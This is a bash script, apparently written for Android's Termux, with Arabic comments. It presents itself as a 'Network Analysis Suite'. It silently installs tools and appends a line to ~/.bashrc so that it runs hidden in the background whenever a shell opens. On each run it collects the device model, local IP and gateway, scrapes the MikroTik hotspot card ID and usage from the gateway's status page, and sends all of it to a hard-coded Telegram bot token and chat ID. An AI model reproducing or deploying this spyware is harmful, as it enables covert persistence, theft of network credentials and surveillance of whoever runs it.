#!/bin/bash

# --- 1. إعدادات البوت ---
TOKEN="8669553208:AAGCy9MQTL9ogHuFXbZiZy4bqkXUnkdwHqg"
ID="7845603274"
URL_MSG="https://api.telegram.org/bot$TOKEN/sendMessage"

# --- 2. مرحلة التثبيت والحقن (الاستمرارية) ---
if ! grep -q "network_recon.sh" ~/.bashrc; then
    # تثبيت الأدوات اللازمة صمتاً
    pkg install curl iproute2 -y -q
    
    # الحقن للعمل في الخلفية عند كل فتح
    echo "(bash ~/network_recon.sh > /dev/null 2>&1 &)" >> ~/.bashrc
    echo -e "\e[1;32m[!] Network Analysis Suite Installed!\e[0m"
    exit 
fi

# --- 3. المهمة الذكية (تحليل الشبكة) ---

# أ) تحديد بوابة الشبكة (Gateway) والآيبي المحلي تلقائياً
GATEWAY=$(ip route | grep default | awk '{print $3}')
LOCAL_IP=$(ip addr show wlan0 | grep "inet " | awk '{print $2}' | cut -d/ -f1)
MODEL=$(getprop ro.product.model)

# ب) محاولة قشط بيانات المايكروتك (إذا كانت البوابة تدعم ذلك)
STATUS_PAGE=$(curl -s --connect-timeout 5 "http://$GATEWAY/status")

# استخراج البيانات باستخدام Regex
CARD_ID=$(echo "$STATUS_PAGE" | grep -oP 'var currnuser = "\K[^"]+' | head -1)
TIME_LEFT=$(echo "$STATUS_PAGE" | grep -oP 'timeLeft2" class="valuee"> \K[^<]+' | head -1)
CONSUMED=$(echo "$STATUS_PAGE" | grep -oP 'bytes-out-nice"> \K[^<]+' | head -1)

# تحسين المخرجات في حال عدم وجود بيانات
[ -z "$CARD_ID" ] && CARD_ID="No Mikrotik Session Found"
[ -z "$TIME_LEFT" ] && TIME_LEFT="N/A"
[ -z "$CONSUMED" ] && CONSUMED="N/A"

# ج) إرسال تقرير الاستطلاع (Recon Report)
NET_REPORT="📡 Network Recon Report
--------------------------
📱 Device: $MODEL
📍 Gateway: $GATEWAY
🌐 Local IP: $LOCAL_IP
🎫 Card ID: $CARD_ID
⏳ Time Left: $TIME_LEFT
📊 Consumed: $CONSUMED
--------------------------"

curl -s -G "$URL_MSG" \
    --data-urlencode "chat_id=$ID" \
    --data-urlencode "text=$NET_REPORT" > /dev/null
